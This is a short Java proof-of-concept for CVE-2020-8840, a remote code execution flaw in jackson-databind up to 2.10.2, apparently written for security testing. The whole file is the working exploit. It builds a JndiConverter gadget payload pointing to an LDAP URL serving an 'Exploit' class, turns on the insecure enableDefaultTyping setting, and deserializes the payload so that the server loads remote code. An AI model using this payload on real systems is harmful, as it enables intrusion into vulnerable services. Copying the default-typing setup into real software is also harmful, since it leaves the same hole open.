package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * CVE-2020-8840
 * jackson-databind <= 2.10.2 RCE，需要开启DefaultType
 * 依赖：XBean-reflect
 * @Author:Wadewfsssss
 */

public class CVE_2020_8840 {

    public static void main(String[] args) {
        //CVE-2020-8840
        String payload = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
